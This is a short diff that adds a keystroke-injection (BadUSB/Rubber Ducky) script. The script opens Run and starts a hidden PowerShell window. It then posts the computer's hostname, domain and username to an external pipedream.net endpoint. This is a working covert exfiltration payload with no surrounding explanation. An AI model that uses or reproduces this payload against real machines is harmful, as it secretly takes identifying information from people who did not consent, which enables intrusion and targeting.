@@ -1,0 +1,9 @@
+DELAY 1000
+GUI r
+DELAY 50
+STRING powershell.exe -windowstyle hidden
+ENTER
+DELAY 100
+STRING Invoke-WebRequest -Uri 'https://2c07fc2bd6f1775478f17b2598c72f8e.m.pipedream.net/infosight' -Method POST -Body "Hostname=$env:COMPUTERNAME&username=$env:USERDNSDOMAIN\$env:USERNAME"
+ENTER
+DELAY 2000
